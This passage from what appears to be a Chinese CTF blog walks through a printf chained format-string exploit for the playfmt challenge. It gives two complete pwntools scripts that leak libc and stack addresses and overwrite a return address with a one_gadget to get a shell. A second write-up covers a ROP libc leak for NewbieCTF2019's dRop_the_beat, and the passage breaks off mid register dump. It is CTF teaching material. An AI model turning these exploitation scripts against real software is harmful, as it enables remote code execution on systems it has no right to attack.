class="number">0xf7e31000</span> <span class="number">0xf7e34000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7e34000</span> <span class="number">0xf7fb0000</span> r-xp   <span class="number">17</span>c000 <span class="number">0</span>      /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb0000</span> <span class="number">0xf7fb6000</span> r--p     <span class="number">6000</span> <span class="number">17b</span>000 /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb6000</span> <span class="number">0xf7fb7000</span> rw-p     <span class="number">1000</span> <span class="number">181000</span> /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb7000</span> <span class="number">0xf7fba000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7fd0000</span> <span class="number">0xf7fd2000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7fd2000</span> <span class="number">0xf7fd5000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line"><span class="number">0xf7fd5000</span> <span class="number">0xf7fd6000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xf7fd6000</span> <span class="number">0xf7ffc000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7ffc000</span> <span class="number">0xf7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7ffd000</span> <span class="number">0xf7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xfff00000</span> <span class="number">0xffffe000</span> rw-p    fe000 <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure><p>首先需要得到当前栈的地址和<code>libc</code>的基地址，这些地址可以很轻松的在栈上找到</p><p>不难发现栈上有libc地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7e30000 0xf7e31000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08:0020│      0xffffd050 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br></pre></td></tr></table></figure><p>可知<code>esp+0x18</code>存放了栈地址，<code>esp+0x20</code>存放了<code>libc</code>的地址，根据32位栈溢出的公式可以得知</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp+0x18 : 0x18 / 4 = 8</span><br><span class="line">esp+0x20 : 0x20 / 4 = 8</span><br></pre></td></tr></table></figure><p>可以得到分别是第6个参数和第8个参数，直接传入<code>%6$p%8$p</code>即可得到栈地址和<code>libc</code>地址</p><p><strong>printf</strong>成链攻击的缺点就是需要很多次<strong>printf</strong>，但是如果你有任意地址读写权限后，相信做到这一点也并非难事 </p><p>这里主要需要解决的就是如何将要改写的地址放在栈上。实现任意地址写需要依赖栈上存在一个链式结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffd048-&gt;0xffffd068-&gt;0xffffd098</span><br></pre></td></tr></table></figure><p>这三个地址都在栈上，我们就可以利用<code>printf</code>的<code>%n</code>对不同链层的数据进行修改，从而使得这条数据链可以指向任意地址 </p><p>下图是一个简单的栈地址空间图，<code>offset</code>表示格式化的参数位置。通过第<code>offset0</code>个参数，利用<code>%hhn</code>可以控制<code>address1</code>的最低位，再通过第<code>offset1</code>个参数，利用<code>%hhn</code>可以写<code>address2</code>的最低位；然后通过<code>offset0</code>参数，利用<code>%hhn</code>修改<code>address1</code>的最低位为<code>原始值+1</code>，再通过<code>offset1</code>参数，利用<code>%hhn</code>可以写<code>address2</code>的次低位；依次循环即可完全控制<code>address2</code>的值，再次利用<code>address1和address2</code>的链式结构，即可实现对<code>address2</code>地址空间的任意写。对应到上面显示的地址空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address0=0xffffd048,offset0=0x18/4=6;</span><br><span class="line">address1=0xffffd068,offset1=0x38/4=14;</span><br><span class="line">address2=0xffffd098,offset2=0x68/4=26;</span><br></pre></td></tr></table></figure><p> <img src="https://p1.ssl.qhimg.com/t01027399ee82efa5dd.png" alt="img"> </p><p>这里我用上面的数据链简单举个例，我们可以利用<code>0xffffd068—▸ 0xffffd098◂— 0x0</code>来修改<code>0xffffd098</code>地址的数据，但是<code>printf</code>的<code>%n</code>最大只能修改到<code>0x2000</code>，也就是说我们一般只能修改<code>一个byte</code>，原本这并没有什么用，但是别忘了，这是一条完整的数据链，我们可以利用<code>ebp  0xffffd048—▸ 0xffffd068—▸ 0xffffd098</code>修改<code>0xffffd068</code>的低地址数据（<code>0xffffd098</code>）的低地址，简单来说就是修改为<code>0xffffd099</code>，然后 <code>0xffffd068 —▸ 0xffffd098◂— 0x0</code>就会变成<code>0xffffd068 —▸ 0xffffd099◂— 0x0</code>，接下来我们就可以利用这条链修改<code>0xffffd099</code>地址的值，也就是<code>第二个byte</code>，依次类推，我们就能在栈上写任意地址，然后在用栈上的地址进行任意读写。就这样往往复复，造成了这个恶性循环。 </p><p>简单来说就是一条栈数据链，前面的链功能是修改我们要任意读写的地址，后面的链的功能则是对前面修改出来的地址进行任意读写。 </p><p>下面是地址写代码的实现，首先获取<code>address1</code>的最低位的原始值，然后依次写<code>address2</code>的各个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def write_address(off0,off1,target_addr):</span><br><span class="line">    io.sendline(&quot;%&#123;&#125;$p&quot;.format(off1))</span><br><span class="line">    io.recvuntil(&quot;0x&quot;)</span><br><span class="line">    addr1 = int(io.recv(8),16)&amp;0xff</span><br><span class="line">    io.recv()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1+i,off0))</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(target_addr&amp;0xff,off1))</span><br><span class="line">        io.recv()        </span><br><span class="line">        target_addr=target_addr&gt;&gt;8</span><br><span class="line">    io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1,off0))</span><br><span class="line">    io.recv()</span><br></pre></td></tr></table></figure><p>这里需要介绍一下<strong>one_gadget</strong></p><p><strong>one-gadget</strong> 是glibc里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的<strong>gadge</strong>t。在我们能够控制<strong>ip</strong>（也就是<strong>pc</strong>）的时候，用<strong>one-gadge</strong>t来做<strong>RCE</strong>（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候<strong>one gadget</strong>就可以搞定 </p><p>再次运行<code>write_address</code>将<code>0xfff566cc</code>写上<code>one_gadget</code>地址</p><p>最后输入<code>quit</code>退出循环，执行<code>return result</code>时就能获取shell</p><p>由于我没拿到题目的<strong>libc</strong>，也没法真正的去做题所以大概就是先了解一下，借用一下别人的EXP</p><p>官方EXP，里面有很多很方便值得学习的格式化字符串函数可以学习一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">do_fmt_ebp_offset = <span class="number">6</span></span><br><span class="line">play_ebp_offset = <span class="number">14</span></span><br><span class="line">main_ebp_offset = <span class="number">26</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_offset</span><span class="params">(format_str , offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> format_str.replace(<span class="string">"&#123;&#125;"</span> , str(offset))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_target_offset_value</span><span class="params">(offset , name)</span>:</span></span><br><span class="line">    payload = format_offset(<span class="string">"%&#123;&#125;$p\x00"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    text = p.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        value = int(text.split(<span class="string">"\n"</span>)[<span class="number">0</span>] , <span class="number">16</span>)</span><br><span class="line">          print(name + <span class="string">" : "</span> + hex(value))</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_last_byte</span><span class="params">(last_byte , offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%"</span> + str(last_byte) + <span class="string">"c"</span> + format_offset(<span class="string">"%&#123;&#125;$hhn"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(addr , value , ebp_offset , ebp_1_offset)</span>:</span></span><br><span class="line">    addr_last_byte = addr &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        now_value = (value &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        modify_last_byte(addr_last_byte + i ,  ebp_offset)</span><br><span class="line">        modify_last_byte(now_value , ebp_1_offset)</span><br><span class="line">p = process(<span class="string">"./playfmt"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./playfmt"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line"><span class="comment"># leak ebp_1_addr then get ebp_addr</span></span><br><span class="line">play_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">"logo_ebp"</span>) </span><br><span class="line"><span class="comment"># get_ebp_addr</span></span><br><span class="line">main_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">"main_ebp"</span>)</span><br><span class="line"><span class="comment"># flag_class_ptr_addr = main_ebp_addr + 0x10</span></span><br><span class="line"><span class="comment"># flag_class_ptr_offset = main_ebp_offset - 4</span></span><br><span class="line">flag_class_ptr_offset = <span class="number">19</span></span><br><span class="line">flag_addr = get_target_offset_value(flag_class_ptr_offset , <span class="string">"flag_addr"</span>) - <span class="number">0x420</span></span><br><span class="line">log.info(hex(flag_addr))</span><br><span class="line"><span class="comment"># puts_plt = elf.plt["puts"]</span></span><br><span class="line">modify(main_ebp_addr + <span class="number">4</span> , flag_addr , do_fmt_ebp_offset , play_ebp_offset)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = format_offset(<span class="string">"%&#123;&#125;$s\x00"</span> , play_ebp_offset + <span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># log.info("flag_addr : " + hex(flag_addr))</span></span><br><span class="line"><span class="comment"># p.sendline("quit")</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另一种EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote('120.78.192.35', 9999)</span></span><br><span class="line">io = process(<span class="string">"./playfmt"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./playfmt'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0x0804889f")</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"%6$p%8$p"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack_addr = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0xffffd648</span>+<span class="number">0xffffd610</span></span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc.address = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0xf7e41000</span>+<span class="number">0xf7c91000</span></span><br><span class="line">log.success(<span class="string">"stack_addr:"</span>+hex(stack_addr))</span><br><span class="line">log.success(<span class="string">"libc_addr:"</span>+hex(libc.address))</span><br><span class="line">io.recv()</span><br><span class="line">offset0=<span class="number">0x18</span>/<span class="number">4</span></span><br><span class="line">offset1=<span class="number">0x38</span>/<span class="number">4</span></span><br><span class="line">offset2=<span class="number">0x68</span>/<span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_address</span><span class="params">(off0,off1,target_addr)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"%&#123;&#125;$p"</span>.format(off1))</span><br><span class="line">    io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    addr1 = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(addr1+i,off0))</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(target_addr&amp;<span class="number">0xff</span>,off1))</span><br><span class="line">        io.recv()        </span><br><span class="line">        target_addr=target_addr&gt;&gt;<span class="number">8</span></span><br><span class="line">    io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(addr1,off0))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address+ <span class="number">0x5f065</span></span><br><span class="line">print(hex(one_gadget))</span><br><span class="line">write_address(offset0,offset1,stack_addr+<span class="number">0x1c</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0x0804889f")</span></span><br><span class="line">write_address(offset1,offset2,one_gadget)</span><br><span class="line">io.sendline(<span class="string">"quit"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里我特别强调一点，在单次<code>printf</code>操作中，是没有办法完成printf成链攻击的，因为单次<code>printf</code>时，一旦你对已经修改过的地址的值进行修改时，则要不就直接<code>crash</code>，要不就根本没反应，所以一定要多次<code>printf</code>才能完成该攻击方式。这是我自己尝试过的，然后单次就能完成printf成链攻击，那么这将是一个非常致命的漏洞 </p></blockquote><p>接下来简单说一下利用方式，<code>printf</code>成链攻击的实施一般至少需要两次<code>printf</code>才行（除非你运气好到爆棚，恰好有一个地址指向了函数的返回地址），第一次我们可以使<code>栈数据链</code>指向某个函数的返回地址，一般为了简单我们可以直接指向第二次<code>printf</code>的返回地址，由于栈布局是固定的，我们确实可以预测其返回地址。然后第二次printf操作时，便可以劫持其返回地址，然后重新返回<code>main</code>或者指向一个可以让<code>printf</code>复用的地址，然后我们就可以重复使用<code>printf</code>实现任意地址读写，这样就完成了一次<code>printf</code>成链攻击。 </p><blockquote><p>参考文章</p><p>【1】非栈上格式化字符串漏洞利用技巧 ：<a href="https://www.anquanke.com/post/id/184717" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184717</a></p><p>【2】printf 成链攻击 ：<a href="http://blog.eonew.cn/archives/1196" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1196</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EXP和调试的小坑-1</title>
      <link href="/2019/11/06/EXP%E2%95%91%E2%95%90%E2%95%A1%E2%89%88%E2%95%A9%E2%95%98%E2%95%A1%E2%94%80%E2%95%A8%C3%AD%E2%94%90%E2%95%99-1/"/>
      <url>/2019/11/06/EXP%E2%95%91%E2%95%90%E2%95%A1%E2%89%88%E2%95%A9%E2%95%98%E2%95%A1%E2%94%80%E2%95%A8%C3%AD%E2%94%90%E2%95%99-1/</url>
      
        <content type="html"><![CDATA[<p>以NewbieCTF2019的<strong>dRop_the_beat</strong>为例子，记录了一下撰写EXP和调试的一些小坑和技巧</p><p>首先检测这个程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy</span><br><span class="line">[*] &apos;/mnt/hgfs/share/NewbieCTF/Pwnable/dRop_the_beat/drop_the_beat_easy&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>就只是开启了栈不可执行的保护，然后用IDA Pro打开查看一下源代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+4h] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"      dP  888888ba   .88888.   888888ba       dP   dP                   dP                           dP   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"      88  88    `8b d8'   `8b  88    `8b      88   88                   88                           88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">".d888b88 a88aaaa8P' 88     88 a88aaaa8P'    d8888P 88d888b. .d8888b.    88d888b. .d8888b. .d8888b. d8888P "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"88'  `88  88   `8b. 88     88  88             88   88'  `88 88ooood8    88'  `88 88ooood8 88'  `88   88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"88.  .88  88     88 Y8.   .8P  88             88   88    88 88.  ...    88.  .88 88.  ... 88.  .88   88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"`88888P8  dP     dP  `8888P'   dP             dP   dP    dP `88888P'    88Y8888' `88888P' `88888P8   dP   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_80489F3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"dROP The beat(easy version)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_80489F3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1) Give Him a Beat!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2) No Beat For You..!"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">":( Sorry, You Can't be with us..."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give Me a Beat!!"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wow... That's AWESOME!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的栈溢出然后ROP的题目，大概思路就是暴露libc版本和地址即可，然后我写了一个错误的EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./drop_the_beat_easy"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./drop_the_beat_easy'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048672")</span></span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(libc_start_main_got)+p32(main)</span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"Wow... That's AWESOME!\n"</span>)</span><br><span class="line"><span class="comment">#info(p.recv())</span></span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我的payload写错了，应该是<strong>main</strong>作为函数的返回地址，<strong>libc</strong>作为第一个参数</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br></pre></td></tr></table></figure><p>这里想说的是如何检查自己的payload是否书写正确，就是最后的返回地址<strong>EIP</strong>是否劫持成功，这里有一个下断点的小技巧，我们一般下在溢出函数后的一个<code>leave</code>指令处</p><p>例如这题的汇编代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804864F</span>                 call    _puts</span><br><span class="line">.text:<span class="number">08048654</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">08048657</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0804865</span>C                 jmp     <span class="keyword">short</span> locret_8048672</span><br><span class="line">.text:<span class="number">0804865</span>E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0804865</span>E</span><br><span class="line">.text:<span class="number">0804865</span>E loc_804865E:                            ; CODE XREF: main+E1↑j</span><br><span class="line">.text:<span class="number">0804865</span>E                 push    offset aSorryYouCanTBe ; <span class="string">":( Sorry, You Can't be with us..."</span></span><br><span class="line">.text:<span class="number">08048663</span>                 call    _puts</span><br><span class="line">.text:<span class="number">08048668</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804866B</span>                 push    <span class="number">1</span>               ; status</span><br><span class="line">.text:<span class="number">0804866</span>D                 call    _exit</span><br><span class="line">.text:<span class="number">08048672</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048672</span></span><br><span class="line">.text:<span class="number">08048672</span> locret_8048672:                         ; CODE XREF: main+<span class="number">121</span>↑j</span><br><span class="line">.text:<span class="number">08048672</span>                 leave</span><br><span class="line">.text:<span class="number">08048673</span>                 retn</span><br><span class="line">.text:<span class="number">08048673</span> ; &#125; <span class="comment">// starts at 804853B</span></span><br><span class="line">.text:<span class="number">08048673</span> main            endp</span><br><span class="line">.text:<span class="number">08048673</span></span><br></pre></td></tr></table></figure><p>我们就一般下在<strong>0x08048672</strong>处，然后开始调试一遍错误的payload</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : <span class="number">0x0</span>       </span><br><span class="line">$ebx   : <span class="number">0x0</span>       </span><br><span class="line">$ecx   : <span 